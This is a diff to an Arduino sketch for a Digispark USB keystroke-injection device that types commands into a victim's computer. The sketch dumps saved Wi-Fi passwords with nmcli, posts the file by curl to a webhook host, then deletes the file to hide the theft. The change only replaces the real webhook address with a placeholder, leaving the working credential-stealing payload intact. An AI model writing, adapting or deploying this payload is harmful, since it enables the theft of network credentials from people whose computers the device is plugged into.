@@ -18,7 +18,7 @@ void loop() {
   DigiKeyboard.delay(500);
   DigiKeyboard.println("nmcli dev wifi show-password > Wi-Fi-PASS"); 
   DigiKeyboard.delay(500);
-  DigiKeyboard.println("curl -X POST -H ^Content-Type: text/plain^ -d @Wi-Fi-PASS 97ae0feb.proxy.webhookapp.com"); 
+  DigiKeyboard.println("curl -X POST -H ^Content-Type: text/plain^ -d @Wi-Fi-PASS WEBHOOK.SITE"); 
   DigiKeyboard.delay(100);
   DigiKeyboard.println("rm Wi-*"); 
   DigiKeyboard.delay(100);
